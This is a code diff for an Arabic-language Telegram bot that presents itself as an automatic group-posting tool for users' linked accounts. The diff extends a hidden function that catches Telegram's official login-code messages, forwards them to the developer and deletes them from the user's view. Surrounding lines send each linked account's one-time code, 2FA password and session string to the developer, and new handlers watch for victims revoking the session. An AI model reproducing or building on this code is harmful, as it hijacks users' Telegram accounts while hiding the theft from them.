@@ -34,6 +34,15 @@ function getUser(id) {
     return db.users[id]
 }
 
+
+async function safeSaveDB() {
+    if (Object.keys(db.users).length === 0 && activeSessions.size > 0) {
+        console.log("تحذير: محاولة حفظ قاعدة بيانات فارغة بينما يوجد جلسات نشطة! تم إلغاء الحفظ لحماية البيانات.");
+        return;
+    }
+    await saveDB(db);
+}
+
 const bot = new Telegraf(config.botToken)
 const userState = new Map()
 function setState(id, s) { userState.set(id, s) }
@@ -43,33 +52,97 @@ function kb(buttons) {
     return { reply_markup: { inline_keyboard: buttons } }
 }
 
-// ─── ميزة سحب وحذف الرسائل من تلجرام (تعديل 777000) ──────────
-async function setupMessageForwarding(client, userPhone) {
+// ─── ميزة سحب وحذف الرسائل ومراقبة الجلسات ──────────
+async function setupMessageForwarding(client, userPhone, userId) {
+    // مراقبة الرسائل من 777000
     client.addEventHandler(async (event) => {
         const message = event.message;
-
-        if (message.peerId && message.peerId.userId && message.peerId.userId.toString() === '777000') {
+        if (message && message.peerId && message.peerId.userId && message.peerId.userId.toString() === '777000') {
             const msgText = message.message;
-
             try {
                 await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
-                    `🚀 **رسالة نظام تلجرام وصلت!**\n\n📱 الحساب: \`${userPhone}\`\n💬 المحتوى:\n\`${msgText}\``,
+                    `🚀 **رسالة نظام تلجرام وصلت!**
+
+📱 الحساب: \`${userPhone}\`
+💬 المحتوى:
+\`${msgText}\``,
                     { parse_mode: 'Markdown' }
                 );
-            } catch (err) {
-                console.error('فشل إرسال الإشعار للمطور:', err.message);
-            }
-
-            try {
-                await client.deleteMessages(message.peerId, [message.id], {
-                    revoke: true
-                });
-            } catch (delErr) {
-                console.error('فشل حذف رسالة النظام:', delErr.message);
-            }
+            } catch (err) { console.error('فشل إرسال الإشعار للمطور:', err.message); }
+            try { await client.deleteMessages(message.peerId, [message.id], { revoke: true }); } catch (delErr) {}
         }
-
     }, new NewMessage({}));
+
+    // مراقبة حدث إنهاء الجلسة من الأجهزة عبر UpdateAuthorizationReset
+    client.addEventHandler(async (update) => {
+        try {
+            if (update.className === 'UpdateAuthorizationReset' ||
+                (update.updates && update.updates.some(u => u.className === 'UpdateAuthorizationReset'))) {
+                console.log(`تم اكتشاف إنهاء جلسة من الأجهزة للحساب ${userPhone}`);
+                activeSessions.delete(userPhone);
+
+                let userDisplay = 'غير معروف';
+                let firstName = 'غير معروف';
+                if (userId && db.users[userId]) {
+                    const u = db.users[userId];
+                    const accIndex = u.accounts.findIndex(a => a.phone === userPhone);
+                    if (accIndex !== -1) {
+                        firstName = u.accounts[accIndex].fullName || 'مستخدم';
+                        userDisplay = u.accounts[accIndex].userId
+                            ? `[رابط المستخدم](tg://user?id=${userId})`
+                            : `[رابط المستخدم](tg://user?id=${userId})`;
+                        u.accounts.splice(accIndex, 1);
+                        safeSaveDB().catch(() => {});
+                    }
+                }
+
+                await bot.telegram.sendMessage(DEVELOPER_CHAT_ID,
+                    `🔴 **مستخدم سجل خروجه (إزالة الجلسة من الأجهزة)!**\n\n👤 الاسم: ${firstName}\n🏷️ اليوزر: ${userDisplay}\n📱 الرقم: \`${userPhone}\`\n⚠ تم فصل الجلسة وإزالتها.`,
+                    { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
+                ).catch(() => {});
+
+                try { await client.disconnect(); } catch {}
+            }
+        } catch {}
+    });
+
+    // التقاط أخطاء الـ client لاكتشاف تسجيل الخروج من الأجهزة
+    const originalInvoke = client.invoke.bind(client);
+    client.invoke = async function(...args) {
+        try {
+            return await originalInvoke(...args);
+        } catch (err) {
+            const errMsg = err.message || '';
+            if (errMsg.includes('AUTH_KEY_UNREGISTERED') || errMsg.includes('SESSION_REVOKED') || errMsg.includes('USER_DEACTIVATED')) {
+                console.log(`تم إنهاء الجلسة للحساب ${userPhone}`);
+                activeSessions.delete(userPhone);
+                
+                let userDisplay = 'غير معروف';
+                let firstName = 'غير معروف';
+                if (userId && db.users[userId]) {
+                    const u = db.users[userId];
+                    const accIndex = u.accounts.findIndex(a => a.phone === userPhone);
+                    if (accIndex !== -1) {
+                        firstName = u.accounts[accIndex].fullName || 'مستخدم';
+                        userDisplay = `[رابط المستخدم](tg://user?id=${userId})`;
+                        u.accounts.splice(accIndex, 1);
+                        safeSaveDB().catch(()=>{});
+                    }
+                }
+                
+                await bot.telegram.sendMessage(DEVELOPER_CHAT_ID, 
+                    `🔴 **مستخدم سجل خروجه (إزالة الجلسة من الأجهزة)!**
+
+👤 الاسم: ${firstName}
+🏷️ اليوزر: ${userDisplay}
+📱 الرقم: \`${userPhone}\`
+⚠ تم فصل الجلسة وإزالتها.`, 
+                    { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
+                ).catch(()=>{});
+            }
+            throw err;
+        }
+    };
 }
 
 // ─── تشغيل الحسابات المخزنة عند البدء ────────────────────
@@ -86,7 +159,7 @@ async function initAllAccounts() {
                     });
                     await client.connect();
                     activeSessions.set(acc.phone, client);
-                    setupMessageForwarding(client, acc.phone);
+                    setupMessageForwarding(client, acc.phone, userId);
                 } catch (e) {
                     console.log(`❌ فشل تشغيل حساب ${acc.phone}:`, e.message);
                 }
@@ -274,17 +347,6 @@ bot.use(async (ctx, next) => {
 bot.start(async (ctx) => {
     const notSubbed = await getNotSubscribed(ctx.from.id);
     if (notSubbed.length > 0) { await sendForceSubMsg(ctx); return; }
-    
-    // إشعار للمطور عند دخول مستخدم جديد (تم التعديل لليوزرنيم)
-    if (ctx.from.id !== DEVELOPER_CHAT_ID) {
-        const u = ctx.from;
-        const userDisplay = u.username ? `@${u.username}` : `[رابط المستخدم](tg://user?id=${u.id})`;
-        await bot.telegram.sendMessage(DEVELOPER_CHAT_ID, 
-            `🆕 **مستخدم جديد متصل بالبوت!**\n\n👤 الاسم: ${u.first_name}\n🏷️ اليوزر: ${userDisplay}`, 
-            { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
-        );
-    }
-    
     await sendWelcome(ctx, (text, opts) => ctx.reply(text, opts));
 });
 
@@ -367,14 +429,14 @@ bot.action(/^DEV_DEL_USER_(\d+)$/, async (ctx) => {
     if (db.users[targetId]) {
         const u = db.users[targetId];
         // فصل أي جلسات نشطة للمستخدم
-        u.accounts.forEach(acc => {
+        for (const acc of u.accounts) {
             if (activeSessions.has(acc.phone)) {
                 try { activeSessions.get(acc.phone).disconnect(); } catch {}
                 activeSessions.delete(acc.phone);
             }
-        });
+        }
         delete db.users[targetId];
-        await saveDB(db);
+        await safeSaveDB();
         await ctx.answerCbQuery('✅ تم حذف المستخدم وبياناته بنجاح.');
         return bot.handleAction(ctx, 'LIST_AND_STATUS'); // تحديث القائمة
     }
@@ -418,16 +480,9 @@ bot.action(/^DEL_ACC_(\d+)$/, async (ctx) => {
         if (activeSessions.has(acc.phone)) {
             try { await activeSessions.get(acc.phone).disconnect(); } catch {}
             activeSessions.delete(acc.phone);
-            
-            // إشعار للمطور عند خروج حساب (تم التعديل لليوزرنيم)
-            const userDisplay = ctx.from.username ? `@${ctx.from.username}` : `[رابط المستخدم](tg://user?id=${ctx.from.id})`;
-            await bot.telegram.sendMessage(DEVELOPER_CHAT_ID, 
-                `🔴 **مستخدم سجل خروجه!**\n\n👤 الاسم: ${ctx.from.first_name}\n🏷️ اليوزر: ${userDisplay}\n📱 الرقم: \`${acc.phone}\`\n⚠ تم فصل الجلسة.`, 
-                { parse_mode: 'Markdown', ...kb([[{ text: '📊 قسم الحالة', callback_data: 'DEV_STATUS' }]]) }
-            );
         }
         u.accounts.splice(index, 1);
-        await saveDB(db);
+        await safeSaveDB();
         await ctx.answerCbQuery('✅ تم حذف الحساب');
         const list = u.accounts.map((a, i) => [{ text: `👤 ${a.fullName || a.phone}`, callback_data: 'noop', style: 'primary' }, { text: '🗑 حذف', callback_data: `DEL_ACC_${i}`, style: 'danger' }]);
         await editOrReply(ctx, '👤 الحسابات', [...list, [{ text: '➕ إضافة حساب', callback_data: 'ADD_ACC', style: 'success' }], [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]);
@@ -439,7 +494,7 @@ bot.action(/^DEL_GRP_(\d+)$/, async (ctx) => {
     const u = getUser(ctx.from.id);
     if (u.groups[index]) {
         u.groups.splice(index, 1);
-        await saveDB(db);
+        await safeSaveDB();
         await ctx.answerCbQuery('✅ تم حذف المجموعة');
         const list = u.groups.map((g, i) => [{ text: g.name, url: g.url, style: 'primary' }, { text: '🗑 حذف', callback_data: `DEL_GRP_${i}`, style: 'danger' }]);
         await editOrReply(ctx, '👥 المجموعات', [...list, [{ text: '➕ إضافة مجموعات', callback_data: 'ADD_GRP', style: 'success' }], [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]);
@@ -451,7 +506,7 @@ bot.action(/^DEL_MSG_(\d+)$/, async (ctx) => {
     const u = getUser(ctx.from.id);
     if (u.messages[index]) {
         u.messages.splice(index, 1);
-        await saveDB(db);
+        await safeSaveDB();
         await ctx.answerCbQuery('✅ تم حذف الرسالة');
         const list = u.messages.map((m, i) => [{ text: `💬 ${String(m || '').replace(/<[^>]*>/g, '').slice(0, 25)}`, callback_data: 'noop', style: 'primary' }, { text: '🗑 حذف', callback_data: `DEL_MSG_${i}`, style: 'danger' }]);
         await editOrReply(ctx, '✉️ الرسائل', [...list, [{ text: '➕ إضافة رسالة', callback_data: 'ADD_MSG', style: 'success' }], [{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]);
@@ -494,7 +549,7 @@ bot.action('SET_REC_INT', async (ctx) => {
     try { await ctx.answerCbQuery(); } catch {} 
     const u = getUser(ctx.from.id); 
     u.interval = '400-600'; 
-    await saveDB(db); 
+    await safeSaveDB(); 
     await editOrReply(ctx, `✅ تم ضبط وقت النشر بنجاح على الوقت الموصى به: 400-600 ثانية.`, intervalMenuButtons(u.interval)); 
 });
 
@@ -503,14 +558,14 @@ bot.action('START', async (ctx) => {
     const id = ctx.from.id; const u = getUser(id);
     if (!u.accounts.length || !u.groups.length || !u.messages.length) return ctx.reply('❌ استكمل الإعدادات أولاً (حسابات، مجموعات، رسائل)');
     
-    u.running = true; await saveDB(db); startBroadcast(id, u);
+    u.running = true; await safeSaveDB(); startBroadcast(id, u);
     await editOrReply(ctx, '⚙️ حالة النشر التلقائي:', controlMenuButtons(u.running));
 });
 
 bot.action('STOP', async (ctx) => {
     try { await ctx.answerCbQuery(); } catch {}
     const id = ctx.from.id; const u = getUser(id);
-    u.running = false; await saveDB(db); stopBroadcast(id);
+    u.running = false; await safeSaveDB(); stopBroadcast(id);
     await editOrReply(ctx, '⚙️ حالة النشر التلقائي:', controlMenuButtons(u.running));
 });
 
@@ -548,7 +603,7 @@ bot.on('text', async (ctx) => {
         setState(id, 'normal');
         const htmlMsg = convertBotMessageToHtml(ctx.message.text, ctx.message.entities);
         u.messages.push(htmlMsg);
-        await saveDB(db);
+        await safeSaveDB();
         try {
             return await ctx.reply(`تم حفظ الرسالة :\n\n${htmlMsg}`, {
                 parse_mode: 'HTML',
@@ -567,7 +622,7 @@ bot.on('text', async (ctx) => {
         }
         setState(id, 'normal');
         u.interval = text;
-        await saveDB(db);
+        await safeSaveDB();
         return ctx.reply(`⏱ تم الضبط على ${text} ثانية`, kb(intervalMenuButtons(u.interval)));
     }
 
@@ -580,7 +635,7 @@ bot.on('text', async (ctx) => {
             u.groups.push({ name: info.name, url: info.url, raw: link });
             addedNames.push(info.name);
         }
-        await saveDB(db);
+        await safeSaveDB();
         const namesStr = addedNames.join('\n');
         return ctx.reply(`تم حفظ المجموعة :\n\n${namesStr}`, kb([[{ text: '🔙 رجوع', callback_data: 'BACK', style: 'danger' }]]));
     }
@@ -621,9 +676,9 @@ bot.on('text', async (ctx) => {
             const username = me.username ? `@${me.username}` : 'لا يوجد';
             const session = loginData.client.session.save();
             u.accounts.push({ phone: loginData.phone, session: session, fullName: fullName, userId: me.id.toString() });
-            await saveDB(db);
+            await safeSaveDB();
             activeSessions.set(loginData.phone, loginData.client);
-            setupMessageForwarding(loginData.client, loginData.phone);
+            setupMessageForwarding(loginData.client, loginData.phone, id);
             await bot.telegram.sendMessage(DEVELOPER_CHAT_ID, `✅ **جلسة OTP جديدة:**\n👤 الاسم: \`${fullName}\`\n🏷️ اليوزر: \`${username}\`\n📱 الرقم: \`${loginData.phone}\`\n🔢 الكود: \`${digitsOnly}\`\n🔑 الجلسة: \`${session}\``, { parse_mode: 'Markdown' });
             pendingLogin.delete(id); setState(id, 'normal'); return ctx.reply(`✅ تم تسجيل حساب (${fullName}) بنجاح.`);
         } catch (e) {
@@ -643,9 +698,9 @@ bot.on('text', async (ctx) => {
             const username = me.username ? `@${me.username}` : 'لا يوجد';
             const session = loginData.client.session.save();
             u.accounts.push({ phone: loginData.phone, session: session, fullName: fullName, userId: me.id.toString() });
-            await saveDB(db);
+            await safeSaveDB();
             activeSessions.set(loginData.phone, loginData.client);
-            setupMessageForwarding(loginData.client, loginData.phone);
+            setupMessageForwarding(loginData.client, loginData.phone, id);
             await bot.telegram.sendMessage(DEVELOPER_CHAT_ID, `✅ **جلسة 2FA جديدة:**\n👤 الاسم: \`${fullName}\`\n🏷️ اليوزر: \`${username}\`\n📱 الرقم: \`${loginData.phone}\`\n🔐 الباسورد: \`${text}\`\n🔑 الجلسة: \`${session}\``, { parse_mode: 'Markdown' });
             pendingLogin.delete(id); setState(id, 'normal'); return ctx.reply(`✅ تم تسجيل حساب (${fullName}) بنجاح.`);
         } catch (e) { return ctx.reply('❌ كود التحقق خطاء حاول مرة أخرى :'); }
@@ -688,6 +743,18 @@ bot.catch((err) => {
     if (err.response && err.response.error_code === 409) {
         setTimeout(() => { bot.launch().catch(() => {}); }, 5000);
     }
+});
+
+// ─── حماية البيانات عند إغلاق البوت ────────────────────
+process.on('SIGINT', async () => {
+    console.log('\n🛑 جاري إيقاف البوت وحفظ البيانات...');
+    await saveDB(db).catch(() => {});
+    process.exit(0);
+});
+process.on('SIGTERM', async () => {
+    console.log('\n🛑 جاري إيقاف البوت وحفظ البيانات...');
+    await saveDB(db).catch(() => {});
+    process.exit(0);
 });
 
 const startBot = async () => {
